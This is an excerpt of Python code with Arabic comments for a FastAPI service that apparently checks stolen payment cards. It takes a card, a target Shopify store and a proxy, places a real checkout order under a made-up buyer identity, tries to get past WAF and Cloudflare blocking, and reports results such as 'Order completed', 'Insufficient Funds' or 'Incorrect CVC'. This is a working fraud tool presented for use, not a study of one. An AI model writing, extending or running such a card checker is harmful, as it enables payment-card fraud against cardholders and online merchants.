...
# إخفاء تحذيرات الـ SSL زي ما كان بيعمل السكربت القديم
import urllib3
...
def fetch_product(session, store_url):
    """جلب المنتج باستخدام requests العادية اللي مش بتستفز WAF"""
    ...
    # جلب من الصفحة الرئيسية كخطة بديلة
    try:
        r = session.get(store_url, timeout=10, verify=False)
        match = re.search(r'variant_id["\']?\s*:\s*["\']?(\d+)["\']?|variants\[0\]\.id\s*=\s*(\d+)', r.text)
        if match:
...
# تم استخدام def بدلاً من async def لكي يقوم FastAPI بتشغيلها في Thread منفصل بـ requests
@app.get("/code/index.php")
def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
    try:
        cc_parts = re.findall(r'\d+', cc.replace('|', ' '))
        if len(cc_parts) < 4: return JSONResponse(content=safe_response("Invalid CC Format", "-", "Shopify Native"))
        ...
        buyer = {
            "email": f"j.doe{random.randint(10000,99999)}@gmail.com", "first_name": "James", "last_name": "Miller",
            "address1": "4024 College Point Blvd", "city": "Flushing", "province": "NY", "zip": "11354", "country": "US", "phone": "2125551234"
        }

        # استخدام requests.Session() العادية تماماً مثل الـ API القديم
        with requests.Session() as session:
            ...
            # 1. سحب المنتج
            variant_id, price = fetch_product(session, store_url)
            if not variant_id: return JSONResponse(content=safe_response("No Products Found (Site Block)", "-", "Shopify Native"))
            ...
            if add_res.status_code not in [200, 201]: 
                return JSONResponse(content=safe_response("Cart Add Blocked by Site", price, "Shopify Native"))
            ...
            if res_chk.status_code in [403, 429] or "cloudflare" in html_chk.lower() or "just a moment" in html_chk.lower():
                return JSONResponse(content=safe_response("Cloudflare WAF Blocked IP", price, "Shopify Native"))
            ...
            if not is_graphql and not classic_token:
                return JSONResponse(content=safe_response("Token Extraction Failed", price, "Shopify Native"))

            # 5. تشفير البطاقة
            pci_headers = {"Origin": "https://checkout.pci.shopifyinc.com", "Content-Type": "application/json", "Accept": "application/json", "User-Agent": headers["User-Agent"]}
            ...
            if res_pci.status_code != 200: return JSONResponse(content=safe_response("Stripe Tokenization Failed", price, "Shopify Native"))
            card_session_id = res_pci.json().get("id")

            # =================================================================
            # المسار الحديث: GraphQL
            # =================================================================
            if is_graphql and session_token:
                ...
                if not queue_token: return JSONResponse(content=safe_response("Proposal Rejected (GQL)", price, "Shopify Native"))
                time.sleep(1)
                ...
                if sub_data.get('__typename') == 'SubmitRejected':
                    ...
                    return JSONResponse(content=safe_response(errs[0].get('localizedMessage', 'System Rejected') if errs else 'System Rejected', price, "Shopify Native"))
                
                receipt_id = sub_data.get('receipt', {}).get('id')
                if not receipt_id: return JSONResponse(content=safe_response("GraphQL Submit Failed", price, "Shopify Native"))
                ...
                for _ in range(6):
                    ...
                    if res_poll.status_code == 200:
                        ...
                        if p_type == 'ProcessedReceipt': return JSONResponse(content=safe_response("Order completed 💎", price, "Shopify Native"))
                        elif p_type == 'FailedReceipt':
                            err = res_poll.json().get('data', {}).get('receipt', {}).get('processingError', {}).get('code', 'DECLINED')
                            if "INSUFFICIENT" in err: return JSONResponse(content=safe_response("Insufficient Funds", price, "Shopify Native"))
                            elif "CVC" in err: return JSONResponse(content=safe_response("Incorrect CVC", price, "Shopify Native"))
                            elif "ZIP" in err or "ADDRESS" in err: return JSONResponse(content=safe_response("ZIP Code Mismatch", price, "Shopify Native"))
                            elif "DO_NOT_HONOR" in err: return JSONResponse(content=safe_response("Do Not Honor", price, "Shopify Native"))
                            return JSONResponse(content=safe_response(f"Declined: {err}", price, "Shopify Native"))
                    time.sleep(1.5)
                return JSONResponse(content=safe_response("Timeout waiting for Bank", price, "Shopify Native"))
            ...
            # =================================================================
                ...
                if "thank you" in res_text or "order completed" in res_text: return JSONResponse(content=safe_response("Order completed 💎", price, "Shopify Native"))
                elif "insufficient" in res_text: return JSONResponse(content=safe_response("Insufficient Funds", price, "Shopify Native"))
                elif "incorrect_cvc" in res_text or "security code" in res_text: return JSONResponse(content=safe_response("Incorrect CVC", price, "Shopify Native"))
                elif "zip code" in res_text or "avs" in res_text: return JSONResponse(content=safe_response("ZIP Code Mismatch", price, "Shopify Native"))
                else:
                    err = re.search(r'class="field__message field__message--error">([^<]+)<', res_pay.text)
                    return JSONResponse(content=safe_response(err.group(1).strip() if err else "Declined / Bank Block", price, "Shopify Native"))

            return JSONResponse(content=safe_response("Unrecognized Store Type", price, "Shopify Native"))

    except Exception as e:
        return JSONResponse(content=safe_response(f"Sys_Err: {str(e)[:40]}", "-", "Shopify Native"))
